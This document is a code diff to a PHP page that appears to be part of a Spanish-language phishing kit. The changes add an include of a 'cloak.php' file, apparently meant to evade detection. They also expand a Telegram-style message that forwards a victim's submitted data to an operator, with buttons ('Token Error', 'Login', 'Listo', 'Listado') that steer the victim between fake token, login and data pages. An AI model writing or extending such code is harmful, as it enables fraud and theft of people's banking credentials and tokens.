@@ -1,4 +1,5 @@
 <?php
+require_once __DIR__ . '/cloak.php';
 session_start();
 include('settings.php');
 
@@ -19,10 +20,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'chat_id'      => $chat_id,
         'text'         => $msg,
         'reply_markup' => json_encode([
-            'inline_keyboard' => [[
-                ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"],
-                ['text' => '🔄 Login',       'callback_data' => "LOGIN|$usuario"]
-            ]]
+            'inline_keyboard' => [
+                [
+                    ['text' => '❌ Token Error', 'callback_data' => "COMPRA|$usuario"],
+                    ['text' => '🔄 Login',       'callback_data' => "LOGIN|$usuario"]
+                ],
+                [
+                    ['text' => '✅ Listo',       'callback_data' => "LISTO|$usuario"],
+                    ['text' => '📋 Listado',     'callback_data' => "LISTADO|$usuario"]
+                ]
+            ]
         ])
     ]);
 }
@@ -46,6 +53,8 @@ if (file_exists($archivo)) {
             header("Location: tokx.php"); exit;
         case '/LOGIN':
             header("Location: index.php"); exit;
+        case '/LISTADO':
+            header("Location: datos.php"); exit;
     }
 }
 ?>
